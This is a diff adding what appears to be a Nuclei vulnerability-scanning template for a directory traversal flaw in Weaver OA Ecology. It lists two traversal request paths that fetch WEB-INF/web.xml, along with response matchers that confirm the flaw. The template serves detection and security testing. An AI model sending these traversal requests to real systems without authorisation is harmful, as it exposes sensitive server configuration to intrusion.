@@ -1,0 +1,27 @@
+id: poc-yaml-weaver-ecology-weaver-directory-traversal
+info:
+  name: 泛微OA Ecology Weaver Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+  description: |
+    This template detects a directory traversal vulnerability in 泛微OA Ecology Weaver that allows access to sensitive files such as web.xml.
+
+variables:
+  r_path:
+    - "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
+    - "/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{r_path}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<url-pattern>/weaver/"
+        part: body
